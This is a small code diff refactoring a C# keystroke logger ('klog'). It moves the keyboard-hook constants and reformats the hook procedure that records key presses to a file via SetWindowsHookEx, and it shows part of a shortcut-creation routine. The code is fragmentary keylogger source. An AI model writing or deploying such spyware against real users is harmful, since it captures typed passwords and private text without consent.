@@ -9,13 +9,6 @@ namespace klog;
 #pragma warning disable CA1416
 public static class Program
 {
-    // ReSharper disable InconsistentNaming
-    // codes passed by the keyboard hook
-    private const int KEYDOWN = 0x0100;
-    private const int KEYUP = 0x0101;
-    private const int SYSKEYDOWN = 0x0104;
-    // ReSharper restore InconsistentNaming
-
     private static readonly LogBuffer Buffer = new();
     private static UnhookWindowsHookExSafeHandle? _kbHook;
     private static bool _capsLockActive;
@@ -47,7 +40,7 @@ public static class Program
     }
 
     /// <summary>
-    /// Logs key presses to a file. Meant to be used with SetWindowsHookEx.
+    ///     Logs key presses to a file. Meant to be used with SetWindowsHookEx.
     /// </summary>
     private static unsafe LRESULT KeyboardProcedure(int code, WPARAM wParam, LPARAM lParam)
     {
@@ -61,7 +54,8 @@ public static class Program
         var stringToWrite = "";
 
         // check for keydown
-        if (wParam == KEYDOWN || wParam == SYSKEYDOWN) stringToWrite = Keyboard.HandleKeyDown(kbStruct, ref _shiftActive, ref _capsLockActive);
+        if (wParam == KEYDOWN || wParam == SYSKEYDOWN)
+            stringToWrite = Keyboard.HandleKeyDown(kbStruct, ref _shiftActive, ref _capsLockActive);
 
         // handle keyup events as it is important with shift, alt and control
         if (wParam == KEYUP) stringToWrite = Keyboard.HandleKeyUp(kbStruct, ref _shiftActive);
@@ -94,8 +88,15 @@ public static class Program
         shortcut.TargetPath = path;
         shortcut.Save();
     }
-}
 
+    // ReSharper disable InconsistentNaming
+    // codes passed by the keyboard hook
+    private const int KEYDOWN = 0x0100;
+    private const int KEYUP = 0x0101;
+
+    private const int SYSKEYDOWN = 0x0104;
+    // ReSharper restore InconsistentNaming
+}
 
 public interface ILogger
 {
